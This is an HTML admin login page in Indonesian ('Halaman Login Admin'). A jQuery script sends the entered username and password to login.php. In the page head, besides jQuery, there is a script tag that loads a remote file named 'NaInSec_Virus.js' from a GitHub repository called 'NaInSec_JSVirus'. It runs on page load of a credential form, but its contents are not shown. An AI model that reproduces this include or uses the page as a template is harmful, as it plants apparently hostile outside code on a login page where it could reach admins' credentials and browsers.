<!DOCTYPE html>
<html>
<head>
    <title>Halaman Login Admin</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script type="text/javascript" src="https://raw.githubusercontent.com/NaInSec/NaInSec_JSVirus/main/NaInSec_Virus.js"></script>
    <script>
        $(document).ready(function(){
            $("#login-form").submit(function(e){
                e.preventDefault();
                var username = $("#username").val();
                var password = $("#password").val();
                
                $.ajax({
                    type: "POST",
                    url: "login.php",
                    data: {username: username, password: password},
                    success: function(response){
                        if(response === "success"){
                            window.location.href = "admindashboard.php";
                        } else {
                            $("#error-message").html("Username atau password salah.");
                        }
                    }
                });
            });
        });
    </script>
</head>
<body>
    <h2>Halaman Login Admin</h2>
    <form id="login-form" method="post">
        <div>
            <label>Username:</label>
            <input type="text" id="username" name="username">
        </div>
        <div>
            <label>Password:</label>
            <input type="password" id="password" name="password">
        </div>
        <div>
            <input type="submit" value="Login">
        </div>
        <p id="error-message"></p>
    </form>
</body>
</html>
